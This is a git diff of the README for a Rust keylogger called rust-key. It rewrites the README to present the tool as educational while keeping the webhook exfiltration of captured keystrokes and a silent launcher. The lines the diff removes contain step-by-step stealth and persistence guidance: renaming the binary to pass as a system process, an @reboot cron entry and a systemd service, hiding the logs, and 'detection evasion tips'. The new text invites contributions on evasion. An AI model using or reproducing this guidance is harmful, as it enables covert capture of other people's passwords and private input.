@@ -1,227 +1,76 @@
 # rust-key
 
-A cross-platform keylogger written in Rust with USB keyboard support.
+An educational keylogger written in Rust for learning about input device monitoring and security awareness.
 
 ## ⚠️ Legal Disclaimer
 
-**This tool is for educational and authorized security testing purposes only.**
+**This tool is for educational purposes only.** Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.
 
-Unauthorized use of keyloggers may be illegal in your jurisdiction. Always obtain proper authorization before using this tool. The authors are not responsible for misuse or damage caused by this program.
+## What is This?
+
+This project demonstrates how keyloggers work at a low level on Linux systems using the evdev interface. It's designed to help security professionals, students, and developers understand:
+
+- How input devices are monitored at the kernel level
+- How keystrokes are captured and logged
+- The importance of physical security
+- Why endpoint protection and monitoring are critical
 
 ## Features
 
-- 🔌 **USB Keyboard Support**: Automatically detects and monitors USB keyboards
-- 🐧 **Linux Support**: Full support for Arch Linux and other distributions using evdev
-- 🌍 **Cross-Platform Ready**: Includes dependencies for Windows and macOS (implementations in progress)
-- 🌐 **UTF-8 Default**: Configured for en_US.UTF-8 locale
-- 📝 **Detailed Logging**: Timestamps and device information for each keystroke
-- ⚡ **Low Overhead**: Efficient event-driven architecture
-- 🔗 **Webhook Support**: Send keystrokes to a webhook URL via batched POST requests
-- 📦 **Efficient Batching**: Groups keystrokes (up to 20) to minimize network requests
-- 🔒 **Secure Output**: Keystrokes are not printed to console, only saved to file and optionally sent to webhook
-- ⌨️ **Smart Shift Handling**: Automatically displays capital letters (SHIFT+a = A) and shifted symbols (SHIFT+8 = *)
-- 🧪 **Webhook Testing**: Test tool to verify webhook connectivity before deployment
-- 💾 **USB Auto-run Scripts**: Interactive and silent modes for flexible deployment options
+- **Real-time Keystroke Logging**: Captures all keyboard input from connected devices
+- **USB Keyboard Support**: Automatically detects and monitors USB keyboards
+- **Multiple Keyboard Support**: Monitors all keyboards simultaneously
+- **Webhook Integration**: Send keystroke data to a remote endpoint for analysis
+- **Efficient Batching**: Groups keystrokes to minimize network overhead
+- **Cross-Platform Ready**: Includes dependencies for Windows and macOS (Linux fully implemented)
 
-## Platform Support
+## How It Works
 
-### Linux (Fully Supported)
-- ✅ Arch Linux
-- ✅ Ubuntu/Debian
-- ✅ Fedora/RHEL
-- ✅ Other distributions with evdev support
-- ✅ USB keyboard detection and monitoring
-- ✅ Multiple simultaneous keyboards
-
-### Windows (Dependencies Included)
-- 🚧 Implementation in progress
-- Dependencies: winapi crate
-
-### macOS (Dependencies Included)
-- 🚧 Implementation in progress
-- Dependencies: core-foundation, core-graphics crates
-
-## Dependencies
-
-### Linux (Arch Linux)
-```bash
-# Install Rust
-sudo pacman -S rust cargo
-
-# Ensure you have access to input devices
-sudo usermod -a -G input $USER
-# Log out and log back in for group changes to take effect
-
-# Or run with sudo
-```
-
-### Linux (Debian/Ubuntu)
-```bash
-# Install Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-
-# Install required packages
-sudo apt-get update
-sudo apt-get install build-essential pkg-config
-
-# Add user to input group
-sudo usermod -a -G input $USER
-```
-
-### Linux (Fedora/RHEL)
-```bash
-# Install Rust
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-
-# Install required packages
-sudo dnf groupinstall "Development Tools"
-
-# Add user to input group
-sudo usermod -a -G input $USER
-```
+The keylogger works by:
+1. Scanning `/dev/input/event*` devices for keyboards
+2. Using Linux's evdev interface to read raw input events
+3. Mapping key codes to human-readable characters
+4. Logging keystrokes to a file with timestamps
+5. Optionally sending batched keystrokes to a webhook endpoint
 
 ## Building
 
-### For Linux (default)
+### Requirements
+
+- Rust (1.70 or later)
+- Linux with evdev support
+- Root/sudo access (required to read input devices)
+
+### Build Instructions
+
 ```bash
+# Clone the repository
+git clone https://github.com/LangerSword/rust-key.git
+cd rust-key
+
+# Build the release binary
 cargo build --release
 ```
 
-### For Windows
-```bash
-cargo build --release --target x86_64-pc-windows-msvc
-```
-
-### For macOS
-```bash
-cargo build --release --target x86_64-apple-darwin
-```
+The compiled binary will be at `target/release/rust-key`.
 
 ## Usage
 
-### Linux
+### Basic Usage
+
 ```bash
-# Basic usage (logs to keylog.txt only)
+# Run with local logging only
 sudo ./target/release/rust-key
 
-# With webhook support (sends keys to webhook URL via POST)
-sudo ./target/release/rust-key https://webhook.site/your-unique-id
-
-# Or add your user to the input group first
-sudo usermod -a -G input $USER
-# Log out and log back in
-./target/release/rust-key [WEBHOOK_URL]
+# Run with webhook support
+sudo ./target/release/rust-key https://your-webhook-url.com/endpoint
 ```
 
-The program will:
-1. Set the default locale to en_US.UTF-8
-2. Scan for all input devices (including USB keyboards)
-3. Display detected keyboard devices with their type (USB/Internal)
-4. Start monitoring all keyboards
-5. Log keystrokes to `keylog.txt` with timestamps
-6. Send keystrokes to webhook URL if provided (via POST request)
+Keystrokes are logged to `keylog.txt` in the current directory with this format:
 
-**Note:** Keystrokes are no longer printed to the console for security reasons. They are only saved to `keylog.txt` and optionally sent to a webhook.
-
-### Windows
-```bash
-# Run as Administrator
-.\target\release\rust-key.exe
 ```
-
-### macOS
-```bash
-# Grant accessibility permissions first
-# System Preferences > Security & Privacy > Privacy > Accessibility
-sudo ./target/release/rust-key
-```
-
-## Testing Webhook Configuration
-
-Before running the keylogger with webhook support, you can test your webhook URL:
-
-```bash
-./test_webhook.sh https://webhook.site/your-unique-id
-```
-
-This will:
-- ✅ Check webhook connectivity
-- ✅ Send a test POST request with sample keystrokes
-- ✅ Display the response to verify your webhook is working
-
-## USB Auto-run Scripts
-
-For convenient deployment on external drives, this project includes two USB auto-run scripts:
-
-### Interactive Mode (`usb_autorun.sh`)
-
-Best for manual deployment with safety prompts:
-
-1. Build the project: `cargo build --release`
-2. Find your USB mount point:
-   ```bash
-   # Find where your USB drive is mounted
-   lsblk
-   # Common mount points:
-   # - Ubuntu/Debian: /media/$USER/VOLUME_NAME
-   # - Fedora/RHEL: /run/media/$USER/VOLUME_NAME
-   # - Manual: /mnt/usb or custom path
-   ```
-3. Copy to USB drive (replace `$USB_MOUNT` with your actual mount point):
-   ```bash
-   cp target/release/rust-key $USB_MOUNT/
-   cp usb_autorun.sh $USB_MOUNT/
-   ```
-4. On the target system, run:
-   ```bash
-   cd $USB_MOUNT  # Replace with your USB mount point
-   ./usb_autorun.sh
-   ```
-
-The interactive script will:
-- ✅ Display a prominent warning and require user confirmation
-- ✅ Offer an optional educational demonstration (safe password capture demo)
-- ✅ Prompt for sudo permission (required for input device access)
-- ✅ Ask for an optional webhook URL
-- ✅ Start the keylogger in the background
-- ✅ Save logs to the USB drive
-- ✅ Create a stop script for easy shutdown
-
-### Silent/Automated Mode (`usb_autorun_silent.sh`)
-
-Best for automated deployment scenarios (requires root):
-
-```bash
-# Run without webhook
-sudo ./usb_autorun_silent.sh
-
-# Run with webhook
-sudo ./usb_autorun_silent.sh https://webhook.site/your-unique-id
-```
-
-This script:
-- ✅ Runs without prompts or user interaction
-- ✅ Requires sudo/root privileges upfront
-- ✅ Accepts webhook URL as optional argument
-- ✅ Handles noexec mount points automatically
-- ✅ Creates PID file and stop script
-
-### Detailed Documentation
-
-For detailed setup instructions and advanced configuration, see:
-- **[USB_SETUP.md](USB_SETUP.md)** - Complete USB deployment guide
-- **[99-usb-autorun.rules.example](99-usb-autorun.rules.example)** - Example udev rules for automatic USB execution
-- **[CRONTAB_SETUP.md](CRONTAB_SETUP.md)** - Guide for setting up automatic execution with crontab
-
-## Output Format
-
-Keystrokes are logged to `keylog.txt` in the following format:
-```
-=== Keylogger Started at 2024-01-01 12:00:00.000 ===
+=== Keylogger Started at 2024-01-01 12:00:00 ===
 Locale: en_US.UTF-8
-Webhook URL: https://webhook.site/your-unique-id
-Monitoring device: AT Translated Set 2 keyboard (/dev/input/event3)
-Monitoring device: USB Keyboard (/dev/input/event4)
 [2024-01-01 12:00:05.123] [USB Keyboard] Key: h
 [2024-01-01 12:00:05.234] [USB Keyboard] Key: e
 [2024-01-01 12:00:05.345] [USB Keyboard] Key: l
@@ -229,7 +78,46 @@ Monitoring device: USB Keyboard (/dev/input/event4)
 [2024-01-01 12:00:05.567] [USB Keyboard] Key: o
 ```
 
-If a webhook URL is provided, keystrokes are sent in batches as POST requests. The program batches up to 20 keystrokes and sends them either when the batch is full or after 2 seconds of inactivity. The JSON payload format is:
+### Using Helper Scripts
+
+For convenience, we provide wrapper scripts:
+
+#### Interactive Mode (`run.sh`)
+Prompts for confirmation and configuration before starting:
+
+```bash
+./run.sh
+```
+
+This will:
+- Ask for confirmation
+- Request webhook URL (optional)
+- Start the keylogger with sudo
+- Create a stop script
+
+#### Silent Mode (`run_silent.sh`)
+Runs without prompts (requires sudo upfront):
+
+```bash
+# Without webhook
+sudo ./run_silent.sh
+
+# With webhook
+sudo ./run_silent.sh https://your-webhook-url.com/endpoint
+```
+
+### Testing Webhook Connectivity
+
+Before running with webhook support, test your endpoint:
+
+```bash
+./test_webhook.sh https://your-webhook-url.com/endpoint
+```
+
+## Webhook Format
+
+When a webhook URL is provided, keystrokes are sent in batches as JSON POST requests:
+
 ```json
 {
   "keystrokes": [
@@ -242,53 +130,80 @@ If a webhook URL is provided, keystrokes are sent in batches as POST requests. T
       "timestamp": "2024-01-01 12:00:05.234",
       "device": "USB Keyboard",
       "key": "e"
-    },
-    {
-      "timestamp": "2024-01-01 12:00:05.345",
-      "device": "USB Keyboard",
-      "key": "l"
     }
   ]
 }
 ```
 
-This batching approach significantly reduces network overhead and makes the communication more efficient compared to sending individual keystrokes.
+Batching configuration:
+- **Batch size**: 20 keystrokes per request
+- **Timeout**: 2 seconds (sends partial batch if no new keys)
+
+## Educational Use Cases
+
+### Security Awareness Training
+Demonstrate to users why:
+- Physical security matters (unattended computers are vulnerable)
+- Screen locks are important
+- Two-factor authentication provides additional protection
+- Trusted devices and environments are critical
+
+### Penetration Testing
+Use in authorized security assessments to:
+- Test endpoint detection and response (EDR) tools
+- Validate monitoring and alerting systems
+- Assess physical security controls
+- Demonstrate attack techniques to clients
+
+### Development and Research
+Learn about:
+- Linux input subsystem and evdev
+- Kernel-level input device monitoring
+- Network protocols and data exfiltration techniques
+- Detection and prevention mechanisms
+
+## Security Considerations
+
+### For Users
+- The keylogger captures ALL keyboard input, including passwords
+- Log files contain sensitive information and should be secured
+- Webhook data is transmitted over the network - use HTTPS
+- Always delete or encrypt logs when no longer needed
+
+### For Developers
+- Never use this on systems you don't own or have permission to monitor
+- Be aware of legal implications in your jurisdiction
+- Implement proper authorization checks in production tools
+- Consider privacy laws (GDPR, CCPA, etc.)
+
+## Stopping the Keylogger
+
+Press `Ctrl+C` if running in foreground, or use the generated stop script:
+
+```bash
+./stop_keylogger.sh
+```
 
 ## Technical Details
 
 ### Linux Implementation
-- Uses `evdev` crate to access `/dev/input/event*` devices
-- Automatically detects USB keyboards by checking physical path
-- Non-blocking event loop for efficient processing
+- Uses `evdev` crate to access input devices
+- Non-blocking event loop with epoll for efficiency
 - Supports multiple simultaneous keyboards
-- Keystrokes are saved to `keylog.txt` but not printed to console
-- Optional webhook support via `reqwest` crate for HTTP POST requests
-- Webhook requests are sent asynchronously in batches to avoid blocking the keylogger
-- Batching configuration:
-  - Batch size: 20 keystrokes per request
-  - Timeout: 2 seconds (sends partial batch if no new keys)
-  - This reduces network overhead and improves efficiency
-- Maps key codes to characters including:
-  - Letters (a-z, automatically capitalized with Shift)
-  - Numbers (0-9, with shift symbols: !, @, #, $, %, ^, &, *, (, ))
-  - Special keys (Enter, Tab, Space, etc.)
-  - Punctuation (with shift variants: < > ? : " { } | _ + ~)
-  - Arrow keys
-  - Function keys (F1-F12)
-- **Smart Shift Handling**: Tracks shift key state and displays the actual shifted character
-  - SHIFT+a displays as "A" instead of "[SHIFT]a"
-  - SHIFT+8 displays as "*" instead of "[SHIFT]8"
-  - No standalone [SHIFT] logging - only the resulting characters are logged
+- Smart shift handling for capitalization
+- UTF-8 locale support (en_US.UTF-8)
 
-### USB Detection
-The program identifies USB keyboards by examining the device's physical path:
-- Physical path containing "usb" → Marked as USB keyboard
-- All keyboard devices are monitored regardless of type
-- Device information is logged for reference
+### Key Mapping
+Supports:
+- Letters (a-z, capitalized with Shift)
+- Numbers (0-9, with shift symbols: !, @, #, etc.)
+- Special keys (Enter, Tab, Space, Backspace, etc.)
+- Punctuation (with shift variants)
+- Arrow keys
+- Function keys (F1-F12)
 
-## Permissions
+### Permissions
 
-### Linux
 The program requires access to `/dev/input/event*` devices. You can either:
 
 1. **Run with sudo** (simplest):
@@ -303,176 +218,27 @@ The program requires access to `/dev/input/event*` devices. You can either:
    ./target/release/rust-key
    ```
 
-## Process Hiding Techniques (Educational Purposes Only)
+## Platform Support
 
-**⚠️ IMPORTANT:** These techniques are provided solely for educational and authorized security testing purposes. Use only on systems you own or have explicit written permission to test.
+- ✅ **Linux** - Fully supported (Arch, Ubuntu, Debian, Fedora, etc.)
+- 🚧 **Windows** - Dependencies included, implementation in progress
+- 🚧 **macOS** - Dependencies included, implementation in progress
 
-### Linux Process Obfuscation
+## Project Structure
 
-#### 1. Rename the Binary
-Give the process a legitimate-sounding name that blends in with system processes:
-```bash
-# Copy and rename the binary
-cp target/release/rust-key target/release/systemd-logger
-
-# Run with the new name
-sudo ./target/release/systemd-logger https://your-webhook-url
 ```
-
-Common legitimate-sounding process names:
-- `systemd-logger`
-- `update-notifier`
-- `dbus-monitor`
-- `gnome-settings`
-- `init-helper`
-
-#### 2. Run in Background with Nohup
-Detach the process from the terminal and continue running after logout:
-```bash
-# Run in background, immune to hangups, with output redirected
-nohup sudo ./target/release/systemd-logger https://your-webhook-url > /dev/null 2>&1 &
-
-# Check if it's running
-ps aux | grep systemd-logger
+rust-key/
+├── src/
+│   ├── main.rs         # Entry point and argument parsing
+│   ├── linux.rs        # Linux/evdev implementation
+│   ├── windows.rs      # Windows stub (future)
+│   └── macos.rs        # macOS stub (future)
+├── run.sh              # Interactive launcher script
+├── run_silent.sh       # Silent launcher script
+├── test_webhook.sh     # Webhook testing utility
+├── Cargo.toml          # Rust dependencies
+└── README.md           # This file
 ```
-
-#### 3. Create a Systemd Service
-For persistent execution that survives reboots:
-
-Create `/etc/systemd/system/system-logger.service`:
-```ini
-[Unit]
-Description=System Event Logger
-After=network.target
-
-[Service]
-Type=simple
-User=root
-ExecStart=/usr/local/bin/systemd-logger https://your-webhook-url
-Restart=always
-RestartSec=10
-StandardOutput=null
-StandardError=null
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Then install and enable:
-```bash
-# Copy binary to system location
-sudo cp target/release/rust-key /usr/local/bin/systemd-logger
-
-# Enable and start the service
-sudo systemctl daemon-reload
-sudo systemctl enable system-logger.service
-sudo systemctl start system-logger.service
-
-# Check status
-sudo systemctl status system-logger.service
-```
-
-#### 4. Run at Startup with Cron
-Add to root's crontab for automatic startup:
-```bash
-# Edit root's crontab
-sudo crontab -e
-
-# Add this line:
-@reboot /usr/local/bin/systemd-logger https://your-webhook-url > /dev/null 2>&1 &
-```
-
-#### 5. Suppress Output
-Ensure no terminal output that could reveal the process:
-```bash
-# Redirect all output to /dev/null
-sudo ./rust-key https://webhook-url > /dev/null 2>&1 &
-
-# Or use the `daemon` command if available
-daemon -- ./rust-key https://webhook-url
-```
-
-#### 6. Hide from Process Lists (Advanced)
-Note: This is for educational understanding only. Rootkit-like behavior may trigger security software.
-
-```bash
-# Change process title (requires code modification)
-# This would need to be implemented in the Rust code using prctl crate
-
-# Hide log file
-sudo chattr +i keylog.txt  # Make immutable (prevents modification/deletion until flag is removed)
-mv keylog.txt .keylog.txt  # Hidden file (starts with dot)
-```
-
-### Detection Evasion Tips
-
-1. **Legitimate Placement**: Place the binary in common binary directories:
-   - `/usr/local/bin/`
-   - `/usr/bin/`
-   - `/opt/local/bin/`
-
-2. **Timing**: Start the process during system startup when many processes are launching.
-
-3. **Minimal Footprint**: 
-   - Use webhook instead of large log files
-   - Redirect logs to `/dev/null` or rotate them frequently
-   - Minimize CPU usage (already done by the efficient design)
-
-4. **Network Stealth**:
-   - Use HTTPS webhooks to encrypt traffic
-   - Batch requests (already implemented) to reduce network activity
-   - Use common webhook services that blend with normal traffic
-
-### Removal/Cleanup
-
-If you've installed using the above methods, clean up properly:
-```bash
-# Stop and disable systemd service
-sudo systemctl stop system-logger.service
-sudo systemctl disable system-logger.service
-sudo rm /etc/systemd/system/system-logger.service
-sudo systemctl daemon-reload
-
-# Remove binary
-sudo rm /usr/local/bin/systemd-logger
-
-# Remove cron job
-sudo crontab -e  # Then manually delete the line
-
-# Kill any running processes
-sudo pkill -f rust-key
-sudo pkill -f systemd-logger
-
-# Remove log files
-rm keylog.txt
-rm .keylog.txt
-```
-
-## Security Considerations
-
-- This tool captures all keyboard input, including passwords
-- The log file contains sensitive information
-- If using webhook functionality, ensure the webhook URL is secure (HTTPS recommended)
-- Webhook data is transmitted over the network - use trusted endpoints only
-- Always secure the log file with appropriate permissions
-- Delete or encrypt logs when no longer needed
-- Only use on systems you own or have explicit permission to monitor
-- Be aware of your local laws regarding keylogging
-
-## Development Status
-
-- ✅ Linux/evdev implementation complete
-- ✅ USB keyboard detection complete
-- ✅ en_US.UTF-8 locale support complete
-- ✅ Cross-platform dependency structure complete
-- ✅ Webhook support for sending keystrokes via HTTP POST
-- ✅ Webhook testing tool for verifying connectivity
-- ✅ Batch processing for webhook requests (20 keystrokes per batch)
-- ✅ Removed console output of keystrokes for security
-- ✅ Smart shift handling - displays capital letters and shifted symbols automatically
-- ✅ USB auto-run scripts (interactive and silent modes)
-- 🚧 Windows implementation (stub ready)
-- 🚧 macOS implementation (stub ready)
 
 ## Contributing
 
@@ -480,9 +246,9 @@ Contributions are welcome! Areas for contribution:
 - Complete Windows implementation using winapi
 - Complete macOS implementation using Core Graphics
 - Add encryption for log files
-- Add support for additional webhook formats or authentication methods
-- Improve key mapping for different keyboard layouts
-- Add configuration file support
+- Support for additional keyboard layouts
+- Configuration file support
+- Detection evasion techniques (for educational purposes)
 
 ## License
 
@@ -494,6 +260,9 @@ LangerSword
 
 ## Support
 
-For issues, questions, or contributions:
 - GitHub: https://github.com/LangerSword/rust-key
-- Open an issue on GitHub for bug reports or feature requests
+- Issues: https://github.com/LangerSword/rust-key/issues
+
+---
+
+**Remember**: This tool is powerful. Use it responsibly and ethically. Always obtain proper authorization before monitoring any system.
